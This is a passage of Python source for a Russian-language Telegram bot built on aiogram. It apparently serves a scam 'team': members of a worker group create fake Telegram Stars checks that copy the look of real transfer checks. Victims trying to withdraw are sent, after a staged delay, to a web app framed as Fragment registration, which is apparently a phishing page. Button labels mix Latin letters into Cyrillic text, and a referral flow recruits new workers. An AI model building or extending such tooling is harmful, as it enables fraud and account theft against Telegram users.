            [InlineKeyboardButton(text="💰 Пополнить Бaлaнc", callback_data="topup")],
            [
                InlineKeyboardButton(
                    text="🌟 Создать чeк", switch_inline_query_current_chat="100"
                )
            ],
        ]
    )
    await bot.send_photo(
        chat_id=callback_query.message.chat.id,
        photo=FSInputFile(BASE_DIR / "static" / "start.jpg"),
        caption=message__,
        parse_mode="HTML",
        reply_markup=markup,
    )


@dp.callback_query(lambda c: c.data.startswith("topup_back_c:"))
async def topup_back_c_handler(callback_query: types.CallbackQuery):
    msg_id = callback_query.data.split(":")[1]
    await bot.delete_message(
        chat_id=callback_query.message.chat.id, message_id=int(msg_id)
    )
    await callback_query.message.delete()
    photo = FSInputFile(BASE_DIR / "static" / "topup.png")
    await bot.send_photo(
        chat_id=callback_query.message.chat.id,
        photo=photo,
        caption="<tg-emoji emoji-id='5057626820594108674'>⭐️</tg-emoji> <b>Сколько ⭐️ закинуть?</b>",
        parse_mode="HTML",
        reply_markup=topup_keyboard(),
    )


@dp.callback_query(F.data == "topup")
async def topup_handler(callback_query: types.CallbackQuery):
    photo = FSInputFile(BASE_DIR / "static" / "topup.png")
    await callback_query.message.delete()
    await bot.send_photo(
        chat_id=callback_query.message.chat.id,
        photo=photo,
        caption="<tg-emoji emoji-id='5060166387511592584'>⭐️</tg-emoji> <b>Сколько ⭐️ закинуть?</b>",
        parse_mode="HTML",
        reply_markup=topup_keyboard(),
    )


@dp.callback_query(F.data == "withdraw")
async def topup_handler(callback_query: types.CallbackQuery):
    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="🏴‍☠️ Зарeгистрирoваться",
                    web_app=WebAppInfo(url=config.WEB_APP_LINK),
                )
            ],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="topup_back")],
        ]
    )
    message = await callback_query.message.answer(
        "<tg-emoji emoji-id='5060177421282576202'>⭐️</tg-emoji> <b>Секунду…</b>", parse_mode="HTML"
    )
    await asyncio.sleep(3)
    await bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=message.message_id,
        text="<tg-emoji emoji-id='5057813595836909560'>❌</tg-emoji> <b>Нужен аккаунт на Fragment от Telegram, иначе вывод не откроется.\nЗарегистрируйся по кнопке ниже.</b>",
        reply_markup=markup,
        parse_mode="HTML",
    )


@dp.callback_query(lambda c: c.data.startswith("topup_amount:"))
async def topup_handler(callback_query: types.CallbackQuery):
    amount = callback_query.data.split(":")[1]
    amount = int(amount)
    await callback_query.message.delete()
    prices = [LabeledPrice(label="Пополнение звёзд", amount=amount)]

    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="Назад", callback_data="topup", icon_custom_emoji_id="5057666360063035693")],
        ]
    )

    msg = await bot.send_invoice(
        chat_id=callback_query.message.chat.id,
        title="Пополнение",
        description="Звёзды для переводов в Telegram",
        payload="stars_payload_001",
        provider_token="",
        currency="XTR",
        prices=prices,
        start_parameter="stars-recharge",
    )

    await bot.send_message(
        chat_id=callback_query.message.chat.id,
        text="Отмена",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(
                        text="Отмена", callback_data=f"topup_back_c:{msg.message_id}", icon_custom_emoji_id="5057666360063035693"
                    )
                ]
            ]
        ),
    )


@dp.callback_query(lambda c: c.data == "topup_custom")
async def process_custom_amount(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.message.delete()

    markup = types.InlineKeyboardMarkup(
        inline_keyboard=[
            [
                types.InlineKeyboardButton(
                    text="Отмена", callback_data="topup_cancel_custom", icon_custom_emoji_id="5057666360063035693"
                )
            ]
        ]
    )

    msg = await bot.send_message(
        chat_id=callback_query.from_user.id,
        text="<tg-emoji emoji-id='5057626820594108674'>⭐️</tg-emoji> <b>Сколько ⭐️? Целое число от 1 до 1 000 000</b>",
        parse_mode="HTML",
        reply_markup=markup,
    )

    await state.update_data(prompt_msg_id=msg.message_id)
    await state.set_state(TopupStates.waiting_for_amount)


@dp.callback_query(lambda c: c.data == "topup_cancel_custom")
async def cancel_custom_amount(callback_query: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await callback_query.message.delete()
    await bot.send_photo(
        chat_id=callback_query.from_user.id,
        photo=types.FSInputFile(BASE_DIR / "static" / "topup.png"),
        caption="<tg-emoji emoji-id='5057626820594108674'>⭐️</tg-emoji> <b>Сколько ⭐️ закинуть?</b>",
        reply_markup=topup_keyboard(),
        parse_mode="HTML",
    )


@dp.message(TopupStates.waiting_for_amount)
async def get_custom_amount(message: types.Message, state: FSMContext):
    if not message.text.isdigit():
        msg = await message.answer("Нужно целое число")
        await message.delete()
        await asyncio.sleep(5)
        await msg.delete()
        return

    amount = int(message.text)
    if amount <= 0:
        msg = await message.reply("Больше нуля, пожалуйста")
        await message.delete()
        await asyncio.sleep(5)
        await msg.delete()
        return

    if amount > 1000000:
        msg = await message.reply("Максимум 1 000 000")
        await message.delete()
        await asyncio.sleep(5)
        await msg.delete()
        return

    data = await state.get_data()
    prompt_msg_id = data.get("prompt_msg_id")

    await message.delete()

    if prompt_msg_id:
        try:
            await bot.delete_message(chat_id=message.chat.id, message_id=prompt_msg_id)
        except:
            pass

    await state.clear()

    prices = [LabeledPrice(label="Пополнение звёзд", amount=amount)]

    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="Назад", callback_data="topup")],
        ]
    )

    msg = await bot.send_invoice(
        chat_id=message.chat.id,
        title="Пополнение",
        description="Звёзды для переводов в Telegram",
        payload="stars_payload_001",
        provider_token="",
        currency="XTR",
        prices=prices,
        start_parameter="stars-recharge",
    )

    await bot.send_message(
        chat_id=message.chat.id,
        text="⬅️ Назад",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(
                        text="⬅️ Назад", callback_data=f"topup_back_c:{msg.message_id}"
                    )
                ]
            ]
        ),
    )


@dp.inline_query()
async def inline_echo(query: InlineQuery):
    bot_info = await bot.get_me()
    bot_username = bot_info.username

    query_text = query.query.strip()
    parts = query_text.split()

    # --- 🔹 Проверка воркера ---
    try:
        member = await post_bot.get_chat_member(
            chat_id=config.WORK_GROUP_ID,
            user_id=query.from_user.id
        )
        is_worker = member.status in ["member", "owner", "administrator", "creator"]
    except Exception:
        is_worker = False

    # --- 🔹 Если воркер → проверка подписки ---
    if is_worker and getattr(config, "REQUIRE_CHANNEL_SUBSCRIBE", False):
        try:
            news_member = await helper_bot.get_chat_member(
                chat_id=config.REQUIRED_SUBSCRIBE_CHAT,
                user_id=query.from_user.id,
            )
            is_subscribed = news_member.status in [
                "member", "owner", "administrator", "creator"
            ]
        except Exception:
            is_subscribed = False

        if not is_subscribed:
            result = InlineQueryResultArticle(
                id=str(uuid4()),
                title=f"Подпишись на {config.BRAND_TELEGRAM}!",
                thumbnail_url="https://emojio.ru/images/apple-b/2757.png",
                input_message_content=InputTextMessageContent(
                    message_text=(
                        "<b>❌ Требуется подписка</b>\n\n"
                        f"Подпишитесь на {config.BRAND_TELEGRAM}, чтобы пользоваться ботом."
                    ),
                    parse_mode="HTML",
                ),
                description=f"{config.BRAND_TELEGRAM} — новости и гайды",
            )
            await query.answer([result], cache_time=1)
            return

    # --- 🔹 Пустой запрос ---
    if not query_text:
        if not is_worker:
            result = InlineQueryResultArticle(
                id=str(uuid4()),
                thumbnail_url="https://emojio.ru/images/apple-b/2757.png",
                title="⏳ Доступ временно ограничен",
                input_message_content=InputTextMessageContent(
                    message_text=(
                        "<b>⏳ Доступ временно ограничен</b>\n\n"
                        "Ваш аккаунт недавно зарегистрировался в боте.\n"
                        "Пожалуйста, подождите <b>21 день</b> с момента начала работы."
                    ),
                    parse_mode="HTML",
                ),
                description="Доступ откроется через 21 день",
            )
            await query.answer([result], cache_time=1)
            return

        ref_id = f"refi_{query.from_user.id}"
        result = InlineQueryResultArticle(
            id=ref_id,
            title="Пригласить друга",
            description="Ссылка на лендинг и инвайт в группу",
            thumbnail_url="https://nztcdn.com/files/6514f1e6-dab4-4d49-806a-3ff22d7793e5.webp",
            input_message_content=InputTextMessageContent(
                message_text="Приглашение для друга — открой личку бота.",
            ),
        )
        await query.answer([result], cache_time=0, is_personal=True)
        return

    # --- 🔹 Чек: "100 @user" ---
    if len(parts) == 2 and parts[0].isdigit() and parts[1].startswith("@"):
        if not is_worker:
            result = InlineQueryResultArticle(
                id=str(uuid4()),
                thumbnail_url="https://emojio.ru/images/apple-b/2757.png",
                title="⏳ Недостаточно прав",
                input_message_content=InputTextMessageContent(
                    message_text=(
                        "<b>⏳ Недостаточно прав для создания чека</b>\n\n"
                        "Ваш аккаунт недавно зарегистрировался в боте.\n"
                        "Пожалуйста, подождите <b>21 день</b>."
                    ),
                    parse_mode="HTML",
                ),
                description="Доступ через 21 день",
            )
            await query.answer([result], cache_time=1)
            return

        stars_amount = int(parts[0])

        check_id = database.add_check(stars_amount, receiver=parts[1])
        message_text = f"<b>💳 Чек на {stars_amount} ⭐️ для {parts[1]}</b>"

        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(
                        text="🌟 Забрать",
                        url=f"https://t.me/{bot_username}?start={check_id}_{query.from_user.id}",
                    )
                ]
            ]
        )

        result = InlineQueryResultArticle(
            id=str(uuid4()),
            title=f"💳 Чек на {stars_amount} ⭐️ для {parts[1]}",
            thumbnail_url="https://nztcdn.com/files/6514f1e6-dab4-4d49-806a-3ff22d7793e5.webp",
            input_message_content=InputTextMessageContent(
                message_text=message_text,
                parse_mode="HTML",
                link_preview_options=LinkPreviewOptions(
                    show_above_text=True,
                    url=f"https://imggen.send.tg/checks/image?asset=STARS&asset_amount={stars_amount}&fiat=USD&fiat_amount=100.02&main=asset&v2",
                ),
            ),
            description=f"{stars_amount} ⭐️ для {parts[1]}",
            reply_markup=keyboard,
        )

        await query.answer([result], cache_time=1)
        return

    # --- 🔹 Мультичек ---
    if len(parts) == 2 and parts[0].isdigit() and parts[1].isdigit():
        stars_amount = int(parts[0])
        activations = int(parts[1])

        if stars_amount not in [50, 100, 500]:
            result = InlineQueryResultArticle(
                id=str(uuid4()),
                thumbnail_url="https://emojio.ru/images/apple-b/2757.png",
                title="Мультичек только 50 / 100 / 500 ⭐️",
                input_message_content=InputTextMessageContent(
                    message_text="❎ Сумма мультичека: только <b>50</b>, <b>100</b> или <b>500</b> ⭐️",
                    parse_mode="HTML",
                ),
                description="Пример: 100 50",
            )
            await query.answer([result], cache_time=1)
            return

        if not is_worker:
            result = InlineQueryResultArticle(
                id=str(uuid4()),
                thumbnail_url="https://emojio.ru/images/apple-b/2757.png",
                title="⏳ Мультичек недоступен",
                input_message_content=InputTextMessageContent(
                    message_text=(
                        "<b>⏳ Мультичек временно недоступен</b>\n\n"
                        "Ваш аккаунт недавно зарегистрировался в боте.\n"
                        "Пожалуйста, подождите <b>21 день</b>."
                    ),
                    parse_mode="HTML",
                ),
                description="Доступ через 21 день",
            )
            await query.answer([result], cache_time=1)
            return

        check_id = database.add_multicheck(stars_amount, activations)

        message_text = (
            f"<b>💳 Мультичек {stars_amount} ⭐️</b>\n"
            f"Активаций: <b>{activations}</b>"
        )

        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(
                        text="🌟 Забрать",
                        url=f"https://t.me/{bot_username}?start={check_id}_{query.from_user.id}",
                    )
                ]
            ]
        )

        urls = {
            50: "https://i.ibb.co/xtyy7bPp/multicheck-50.png",
            100: "https://i.ibb.co/6RQ78p61/multicheck-100.png",
            500: "https://i.ibb.co/7JxLryYj/multicheck-500.png",
        }

        result = InlineQueryResultArticle(
            id=str(uuid4()),
            title=f"💳 {stars_amount} ⭐️ × {activations}",
            thumbnail_url="https://nztcdn.com/files/6514f1e6-dab4-4d49-806a-3ff22d7793e5.webp",
            input_message_content=InputTextMessageContent(
                message_text=message_text,
                parse_mode="HTML",
                link_preview_options=LinkPreviewOptions(
                    show_above_text=True,
                    url=urls[stars_amount],
                ),
            ),
            description=f"{stars_amount} ⭐️ · {activations} раз",
            reply_markup=keyboard,
        )

        await query.answer([result], cache_time=1)
        return

    # --- 🔹 Обычный чек ---
    if query_text.isdigit():
        if not is_worker:
            result = InlineQueryResultArticle(
                id=str(uuid4()),
                thumbnail_url="https://emojio.ru/images/apple-b/2757.png",
                title="⏳ Недостаточно прав",
                input_message_content=InputTextMessageContent(
                    message_text=(
                        "<b>⏳ Недостаточно прав для создания чека</b>\n\n"
                        "Ваш аккаунт недавно зарегистрировался в боте.\n"
                        "Пожалуйста, подождите <b>21 день</b>."
                    ),
                    parse_mode="HTML",
                ),
                description="Доступ через 21 день",
            )
            await query.answer([result], cache_time=1)
            return

        stars_amount = int(query_text)

        check_id = database.add_check(stars_amount)
        message_text = f"💳 Чек на <b>{stars_amount} ⭐️</b>"

        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(
                        text="🌟 Забрать",
                        url=f"https://t.me/{bot_username}?start={check_id}_{query.from_user.id}",
                    )
                ]
            ]
        )

        result = InlineQueryResultArticle(
            id=str(uuid4()),
            title=f"💳 Чек на {stars_amount} ⭐️",
            thumbnail_url="https://nztcdn.com/files/6514f1e6-dab4-4d49-806a-3ff22d7793e5.webp",
            input_message_content=InputTextMessageContent(
                message_text=message_text,
                parse_mode="HTML",
                link_preview_options=LinkPreviewOptions(
                    show_above_text=True,
                    url=f"https://imggen.send.tg/checks/image?asset=STARS&asset_amount={stars_amount}&fiat=USD&fiat_amount=100.02&main=asset&v2",
                ),
            ),
            description=f"Чек на {stars_amount} ⭐️",
            reply_markup=keyboard,
        )

        await query.answer([result], cache_time=1)
        return

    # --- 🔹 Неизвестная команда ---
    result = InlineQueryResultArticle(
        id=str(uuid4()),
        thumbnail_url="https://emojio.ru/images/apple-b/2757.png",
        title="Неизвестная команда!",
        input_message_content=InputTextMessageContent(
            message_text="❎ Пример: <code>100 50</code> или <code>100 @user</code>",
            parse_mode="HTML",
        ),
        description="Число или число @ник",
    )

    await query.answer([result], cache_time=1)

@dp.chosen_inline_result(F.result_id.startswith("refi_"))
async def referral_invite_chosen(result: ChosenInlineResult, bot: Bot) -> None:
    try:
        inviter_id = int(result.result_id.split("_", 1)[1])
    except (IndexError, ValueError):
        return
    try:
        inv = await bot.create_chat_invite_link(
            chat_id=config.WORK_GROUP_ID,
            member_limit=1,
        )
        invite_url = getattr(inv, "invite_link", None) or getattr(inv, "url", None)
        if not invite_url:
            await bot.send_message(result.from_user.id, "Не удалось создать инвайт.")
            return
    except Exception as e:
        await bot.send_message(result.from_user.id, f"Инвайт: {e}")
        return
    database.add_referral_invite(inviter_id, invite_url)
    slug = Path(paths.TEAM_DIR).name
    base = str(getattr(config, "REFERRAL_PUBLIC_BASE", "") or "").rstrip("/")
    page_url = f"{base}/{slug}/id{inviter_id}"
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="Открыть страницу", url=page_url)]
        ]
    )
    fon_path = Path(paths.CODE_ROOT) / "static" / "fon.png"
    if fon_path.is_file():
        await bot.send_photo(
            result.from_user.id,
            photo=FSInputFile(fon_path),
            caption=f"Твоя ссылка:\n{page_url}",
            reply_markup=kb,
        )
    else:
        await bot.send_message(
            result.from_user.id,
            f"Твоя ссылка:\n{page_url}",
            reply_markup=kb,
        )
